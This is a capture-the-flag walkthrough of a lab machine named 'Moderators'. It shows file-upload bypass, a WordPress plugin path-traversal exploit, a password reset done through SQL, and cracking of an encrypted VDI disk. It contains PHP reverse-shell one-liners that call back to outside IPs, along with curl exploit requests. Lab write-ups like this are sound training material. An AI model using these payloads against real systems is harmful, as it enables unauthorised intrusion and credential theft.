# Moderators

Performing a **nmap** scan to discover open ports and services versions on the machine.

![Untitled](Moderators/Untitled.png)

File scanning on port 80.

![Untitled](Moderators/Untitled%201.png)

The blog has parameters with some reports, we can fuzz numbers to discover more reports.

![Untitled](Moderators/Untitled%202.png)

The hash is the number of the report converted to MD5.

![Untitled](Moderators/Untitled%203.png)

```jsx
echo -n "9798" | md5sum
e21cece511f43a5cb18d4932429915ed  -
echo -n "2589" | md5sum
743c41a921516b04afde48bb48e28ce6  -
echo -n "3478" | md5sum
b071cfa81605a94ad80cfa2bbc747448  -
echo -n "4221" | md5sum
74d90aafda34e6060f9e8433962d14fd  -
echo -n "7612" | md5sum
ce5d75028d92047a9ec617acb9c34ce6  -
echo -n "8121" | md5sum
afecc60f82be41c1b52f6705ec69e0f1  -
echo -n "81212" | md5sum
b1c7b1185d83e5e447a068f5a82db680  -
```

After some fuzzing, I discovered that the file extension is an PDF file:

```jsx
logs.pdf
```

![Untitled](Moderators/Untitled%204.png)

Two files had written data:

```jsx
743c41a921516b04afde48bb48e28ce6
ce5d75028d92047a9ec617acb9c34ce6
```

On the PDF, we can see that there is a report PHP file used to uload log files.

![Untitled](Moderators/Untitled%205.png)

Just PDF files can be uploaded.

![Untitled](Moderators/Untitled%206.png)

With PDF headers we can bypass the file verification:

![Untitled](Moderators/Untitled%207.png)

Requesting the file the phpinfo was executed.

![Untitled](Moderators/Untitled%208.png)

Listing disabled functions:

![Untitled](Moderators/Untitled%209.png)

We can create a PHP reverse shell into the PDF to gain remote code execution.

```jsx
'$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

The user of the reverse shell is www-data, we need to obtain the user Lexi.

![Untitled](Moderators/Untitled%2010.png)

Port 8080 has host a Wordpresss.

![Untitled](Moderators/Untitled%2011.png)

Plugins inside the Wordpress folder.

![Untitled](Moderators/Untitled%2012.png)

There is an exploit to the brandfolder plugin, but the null byte doesn’t work in this version of PHP, we need to find a way to bypass it.

[https://www.exploit-db.com/exploits/39591](https://www.exploit-db.com/exploits/39591)

We can create a file with the name to concatenate to the “wp-load.php”

![Untitled](Moderators/Untitled%2013.png)

Exploit code and description:

![Untitled](Moderators/Untitled%2014.png)

```jsx
curl http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wb_abspath=../../../../../../../dev/shm/testing
testingwp-load.php
```

Performing the request.

![Untitled](Moderators/Untitled%2015.png)

```jsx
curl http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../../../../../dev/shm/test

$sock=fsockopen("10.10.14.96",3303);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

After obtain the reverse shell, I used the ID_RSA key to obtain SSH session.

![Untitled](Moderators/Untitled%2016.png)

Performing Wordpress port forwarding with SSH.

![Untitled](Moderators/Untitled%2017.png)

Generation of an PHPASSS password.

![Untitled](Moderators/Untitled%2018.png)

Updating the admin password of the Wordpress.

```jsx
UPDATE `wp_users` SET `user_pass` = '$P$BlDKgzCnaSGs6UCBnDcbOymitH./4s.' WHERE user_login = 'admin'
```

![Untitled](Moderators/Untitled%2019.png)

The admin password “zapzap” worked on the panel:

![Untitled](Moderators/Untitled%2020.png)

The accreditation on the panel worked.

![Untitled](Moderators/Untitled%2021.png)

We can look the John password:

![Untitled](Moderators/Untitled%2022.png)

Using the password of John in SSH we were able to obtain the session with the user.

![Untitled](Moderators/Untitled%2023.png)

The home folder of john has an interesting VDI file.

![Untitled](Moderators/Untitled%2024.png)

We transfer the file to our machine:

![Untitled](Moderators/Untitled%2025.png)

This VDI is encrypted, we need to find a way to decrypt the VDI File.

![Untitled](Moderators/Untitled%2026.png)

[https://github.com/axcheron/pyvboxdie-cracker](https://github.com/axcheron/pyvboxdie-cracker)

To crack the VDI file we can use the pyvboxdie-cracker with the rockyou wordlist:

```jsx
| perl -nle 'print if m{^[[:ascii:]]+$}'
```

![Untitled](Moderators/Untitled%2027.png)

Changing the VDI file to raw .img

![Untitled](Moderators/Untitled%2028.png)

![Untitled](Moderators/Untitled%2029.png)

Cracking the luks2 file:

![Untitled](Moderators/Untitled%2030.png)

[https://diverto.github.io/2019/11/18/Cracking-LUKS-passphrases](https://diverto.github.io/2019/11/18/Cracking-LUKS-passphrases)

[https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

[https://serverfault.com/questions/515085/how-to-mount-a-luks-encrypted-file](https://serverfault.com/questions/515085/how-to-mount-a-luks-encrypted-file)

Decrypted disk

![Untitled](Moderators/Untitled%2031.png)

The distro_update bash script file has the root password:

![Untitled](Moderators/Untitled%2032.png)